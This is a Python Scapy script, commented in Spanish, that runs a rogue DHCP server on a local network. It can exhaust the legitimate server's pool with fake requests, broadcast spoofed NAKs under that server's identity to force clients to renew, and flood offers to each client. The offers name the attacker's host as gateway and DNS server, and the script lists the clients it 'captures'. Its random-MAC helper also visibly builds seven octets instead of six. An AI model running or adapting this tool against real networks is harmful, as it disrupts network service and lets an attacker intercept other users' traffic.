#!/usr/bin/env python3
"""
DHCP Spoofing Ultra-Rápido - Gana la carrera al servidor legítimo
"""

import os
import random
import re
import signal
import subprocess
import sys
import time
from threading import Thread
from scapy.all import (
    BOOTP, DHCP, Ether, IP, UDP, conf,
    get_if_hwaddr, sendp, sniff, srp
)

running = True
leases = {}
stats = {'wins': 0, 'losses': 0}


def signal_handler(sig, frame):
    global running
    running = False


signal.signal(signal.SIGINT, signal_handler)


def require_root():
    if os.geteuid() != 0:
        print("[!] Ejecutar como root")
        sys.exit(1)


def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
    except:
        return ""


def get_interface_ip(iface):
    output = run_cmd(["ip", "-4", "addr", "show", iface])
    match = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+)', output)
    return match.group(1) if match else None


def list_interfaces():
    interfaces = []
    for iface in sorted(os.listdir("/sys/class/net")):
        if iface != "lo":
            ip = get_interface_ip(iface)
            interfaces.append({'name': iface, 'ip': ip})
    return interfaces


def choose_interface():
    interfaces = list_interfaces()
    print("\n[+] Interfaces disponibles:")
    for idx, iface in enumerate(interfaces, 1):
        ip_str = f"IP:{iface['ip']}" if iface['ip'] else "Sin IP"
        print(f"  {idx}. {iface['name']:<10} {ip_str}")

    while True:
        choice = input("\n[?] Selecciona interfaz (número o nombre): ").strip()
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
        for iface in interfaces:
            if iface['name'] == choice:
                return iface
        print("[!] Inválido")


def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0,255), random.randint(0,255),
        random.randint(0,255), random.randint(0,255),
        random.randint(0,255), random.randint(0,255))


def mac_to_bytes(mac):
    return bytes.fromhex(mac.replace(":", ""))


def flood_offers(iface, server_mac, server_ip, client_mac, xid, chaddr, pool):
    """
    Técnica 1: Flood de múltiples OFFERs consecutivos
    Enviar 5-10 ofertas rápidamente aumenta probabilidad de ganar
    """
    for offered_ip in pool[:5]:  # Primeras 5 IPs del pool
        if not running:
            break

        offer = (
            Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src=server_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, htype=1, hlen=6, xid=xid, yiaddr=offered_ip,
                  siaddr=server_ip, chaddr=chaddr) /
            DHCP(options=[
                ("message-type", "offer"),
                ("server_id", server_ip),
                ("lease_time", 3600),
                ("subnet_mask", "255.255.255.240"),
                ("router", server_ip),
                ("name_server", server_ip),
                ("broadcast_address", "14.2.0.175"),
                "end"
            ])
        )

        # Enviar sin delay entre ellos
        sendp(offer, iface=iface, verbose=False)

    print(f"    └─ Enviados 5 OFFERs rápidos a {client_mac}")


def send_ack(server_mac, server_ip, client_mac, xid, chaddr, assigned_ip, iface):
    """ACK optimizado"""
    ack = (
        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=server_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, htype=1, hlen=6, xid=xid, yiaddr=assigned_ip,
              siaddr=server_ip, chaddr=chaddr) /
        DHCP(options=[
            ("message-type", "ack"),
            ("server_id", server_ip),
            ("lease_time", 3600),
            ("subnet_mask", "255.255.255.240"),
            ("router", server_ip),
            ("name_server", server_ip),
            ("broadcast_address", "14.2.0.175"),
            "end"
        ])
    )
    sendp(ack, iface=iface, verbose=False)


def get_dhcp_option(pkt, name):
    if DHCP not in pkt:
        return None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == name:
            return opt[1]
    return None


def starve_legitimate_dhcp(iface, count=50):
    """
    Técnica 2: Agotar pool del servidor legítimo primero
    """
    print(f"\n[*] Fase 1: Agotando pool del servidor legítimo...")
    print(f"    Enviando {count} solicitudes falsas...")

    for i in range(count):
        mac = random_mac()
        xid = random.randint(1, 0xFFFFFFFF)
        chaddr = mac_to_bytes(mac) + b'\x00' * 10

        discover = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=chaddr, xid=xid, flags=0x8000) /
            DHCP(options=[("message-type", "discover"), "end"])
        )

        sendp(discover, iface=iface, verbose=False)

        if i % 10 == 0:
            print(f"    Progreso: {i}/{count}")

        time.sleep(0.01)

    print(f"[+] Starvation completado. Esperando 3 segundos...")
    time.sleep(3)


def force_renewal(iface, server_mac, server_ip):
    """
    Técnica 3: Forzar renovación enviando DHCP NAK spoofeado
    Esto hace que los clientes reconvoquen DHCP inmediatamente
    """
    print(f"\n[*] Fase 2: Forzando renovaciones DHCP...")

    # Enviar NAKs broadcast para forzar renovación
    for _ in range(10):
        nak = (
            Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src=server_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, htype=1, hlen=6, xid=random.randint(1,0xFFFFFFFF)) /
            DHCP(options=[
                ("message-type", "nak"),
                ("server_id", server_ip),
                "end"
            ])
        )
        sendp(nak, iface=iface, verbose=False)
        time.sleep(0.1)

    print(f"[+] NAKs enviados. Clientes deberían renovar ahora.")


def handle_packet(pkt, server_mac, server_ip, pool, iface):
    """Manejador ultra-rápido de paquetes"""
    global stats

    if DHCP not in pkt or BOOTP not in pkt:
        return

    msg_type = get_dhcp_option(pkt, "message-type")
    client_mac = pkt[Ether].src
    xid = pkt[BOOTP].xid
    chaddr = mac_to_bytes(client_mac) + b'\x00' * 10

    # DISCOVER - Responder INMEDIATAMENTE con flood de ofertas
    if msg_type == 1 or msg_type == "discover":
        print(f"\n📥 DISCOVER de {client_mac}")

        # Técnica: Responder en thread separado para no bloquear
        Thread(target=flood_offers, args=(
            iface, server_mac, server_ip, client_mac, xid, chaddr, pool
        ), daemon=True).start()

        print(f"    └─ Flood de OFFERs iniciado...")

    # REQUEST - Verificar si es para nosotros
    elif msg_type == 3 or msg_type == "request":
        server_id = get_dhcp_option(pkt, "server_id")

        if server_id == server_ip:
            # Es para nosotros! Enviar ACK inmediato
            requested_ip = get_dhcp_option(pkt, "requested_addr")
            assigned_ip = requested_ip if requested_ip else pool[0]

            send_ack(server_mac, server_ip, client_mac, xid, chaddr, assigned_ip, iface)

            if client_mac not in leases:
                leases[client_mac] = assigned_ip
                stats['wins'] += 1

            print(f"✅ ACK enviado a {client_mac}")
            print(f"   IP: {assigned_ip} | Total victorias: {stats['wins']}")
        else:
            # El cliente eligió al otro servidor
            stats['losses'] += 1
            print(f"❌ Cliente {client_mac} eligió servidor {server_id}")


def main():
    global running

    require_root()

    print("""
╔══════════════════════════════════════════════════════════════════╗
║     DHCP SPOOFING ULTRA-RÁPIDO - Gana la carrera al DHCP         ║
╠══════════════════════════════════════════════════════════════════╣
  Estrategias implementadas:
  1. Flood de múltiples OFFERs (5 ofertas seguidas)
  2. Starvation previo del pool legítimo (opcional)
  3. Forzar renovaciones con NAKs (opcional)
  4. Respuesta en thread separado (sin bloqueo)
╚══════════════════════════════════════════════════════════════════╝
""")

    # Selección de interfaz
    iface_info = choose_interface()
    iface_name = iface_info['name']
    server_ip = iface_info['ip']

    if not server_ip:
        print("[!] La interfaz no tiene IP")
        sys.exit(1)

    # Pool de IPs (excluyendo la del atacante)
    last_octet = int(server_ip.split('.')[3])
    pool = [f"14.2.0.{i}" for i in range(161, 175) if i != last_octet]

    server_mac = get_if_hwaddr(iface_name)

    conf.iface = iface_name
    conf.verb = 0

    print(f"\n[+] Configuración:")
    print(f"    Interfaz: {iface_name}")
    print(f"    Tu IP/GW: {server_ip}")
    print(f"    Pool: {pool[0]} - {pool[-1]} ({len(pool)} IPs)")

    # Opciones de ataque agresivo
    print(f"\n[?] Opciones agresivas:")
    starve = input("    1. Agotar pool del servidor legítimo primero? [s/N]: ").strip().lower()
    force = input("    2. Forzar renovaciones DHCP? [s/N]: ").strip().lower()

    if starve in ['s', 'si', 'y', 'yes']:
        starve_legitimate_dhcp(iface_name, count=100)

    if force in ['s', 'si', 'y', 'yes']:
        force_renewal(iface_name, server_mac, server_ip)

    print(f"\n[*] Iniciando servidor DHCP rogue...")
    print(f"[*] Respondiendo con FLOOD de ofertas a cada DISCOVER")
    print(f"[*] Presiona Ctrl+C para detener\n")

    try:
        sniff(
            iface=iface_name,
            filter="udp and (port 67 or port 68)",
            prn=lambda pkt: handle_packet(pkt, server_mac, server_ip, pool, iface_name),
            stop_filter=lambda x: not running
        )
    except KeyboardInterrupt:
        pass

    print(f"\n\n[+] Estadísticas finales:")
    print(f"    Victorias: {stats['wins']}")
    print(f"    Derrotas:  {stats['losses']}")
    print(f"    Eficiencia: {stats['wins']/(stats['wins']+stats['losses'])*100:.1f}%" if (stats['wins']+stats['losses']) > 0 else "    N/A")

    if leases:
        print(f"\n[+] Clientes capturados ({len(leases)}):")
        for mac, ip in sorted(leases.items()):
            print(f"    {ip} → {mac}")


if __name__ == "__main__":
    main()
